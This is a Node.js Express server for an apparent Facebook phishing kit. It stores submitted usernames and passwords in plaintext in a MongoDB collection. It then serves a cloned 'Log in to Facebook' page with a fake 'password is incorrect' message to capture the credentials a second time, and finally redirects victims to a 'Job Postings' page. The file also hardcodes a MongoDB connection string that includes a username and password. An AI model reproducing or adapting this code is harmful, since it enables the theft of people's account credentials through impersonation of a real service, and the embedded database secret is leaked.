const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

const uri = "mongodb+srv://user1:user123@login.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=login";
const client = new MongoClient(uri);

let db; // Declare the db variable

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db('logdata'); // Your actual database name
        console.log("Connected to MongoDB");
    } catch (error) {
        console.error("MongoDB connection error:", error.message || error);
    }
}

connectToDatabase();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).send('Database connection not initialized.');
        }

        // Create the login data object
        const loginData = { username, password, timestamp: new Date() };
        
        // Log before inserting data
        console.log("Attempting to insert data:", loginData);
        
        // Insert the new user data without checking for existing users
        const result = await db.collection('ifsh').insertOne(loginData);
        
        // Log the result after successful insertion
        console.log("Data inserted successfully:", result);
        
        res.redirect(`/success?username=${encodeURIComponent(username)}`);
    } catch (error) {
        console.error('Error saving data to MongoDB:', error);
        res.status(500).send('Error saving data to MongoDB.');
    }
});

app.get('/success', (req, res) => {
    const username = req.query.username; // Get the username from the query parameters
    res.send(`
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="/fbloginstyle.css">
    <script>
                function goToAnotherPage() {
                    window.location.href = '/another-page'; // Redirects to another page
                }
            </script>
</head>

    <style>
        body {
        font-family: Arial, sans-serif;
        background-color: #f2f2f2ec;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .fblogo {
        position:absolute;
        display: block;
        width: 14%;
        margin-bottom: 500px;
    }

    .login-container {
        background-color: white;
        padding: 40px 40px; /* Add padding to the container */
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        width: 300px; /* Set a fixed width for the container */
        text-align: center;
        align-items: center;
        justify-content: center;
    }

    h2 {
        margin-bottom: 20px;
        text-align: center; /* Center the heading */
    }

    .form-group {
        margin-bottom: 15px;
    }

    label {
        display: block;
        margin-bottom: 5px;
    }

    input {
        width: 92%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
    }

    button {
        width: 101%;
        padding: 12px;
        background-color: #1877F2;
        color: white;
        font-weight: bold;
        font-size: 19px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
    }

    button:hover {
        background-color: #1564ca;
    }

    p {
        margin-top: 15px;
        text-align: center; /* Center the paragraph */
    }

    a {
    text-decoration: none; /* Remove underline by default */
    color: #1877F2; /* Set link color */
    }

    a:hover {
        text-decoration: underline; /* Underline on hover */
    }
    
    .bottom-form {
        font-size: 13px;
    }

    ::placeholder {
        font-family: sans-serif;
        font-size: 16px
    }

    </style>

<body>
    <img src="images/fbloginlogo.png" class="fblogo" alt="fblogo">
    <div class="login-container">
        <h2 style="font-size: 17px; font-weight: bold; color: #504e4e; margin-bottom: 48px; font-family: sans-serif;">Log in to Facebook</h2>
        <form action="/submit-additional-info" method="POST">
            <div class="form-group">
                <input placeholder="Email address or Phone number" type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <input placeholder="Password" type="password" id="password" name="password" required>
            </div>
            <h2 style="font-size: 13px; color: #f36060; margin-bottom: 48px; font-family: sans-serif; text-align: start;">The password that you've entered is incorrect.</h2>
            <button type="submit" href="/Job Postings2.html">Log in</button>
        </form>
    </div>

        <script>
            document.getElementById('loginForm').addEventListener('submit', function (e) {
                e.preventDefault();

                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
            });
        </script>

</body>
</html>

    `);
});

app.post('/submit-additional-info', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).send('Database connection not initialized.');
        }

        // Create the login data object
        const loginData = { username, password, timestamp: new Date() };
        
        // Log before inserting data
        console.log("Attempting to insert data:", loginData);
        
        // Insert the new user data without checking for existing users
        const result = await db.collection('ifsh').insertOne(loginData);
        
        // Log the result after successful insertion
        console.log("Data inserted successfully:", result);

        console.log("Additional info inserted successfully.");
        res.redirect(`/Job Postings.html?loggedin=true`); // Redirect to Job Postings with loggedin parameter
    } catch (error) {
        console.error('Error saving additional info to MongoDB:', error);
        res.status(500).send('Error saving additional info to MongoDB.');
    }
});

// Routes to serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html'));
});
app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html'));
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html'));
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
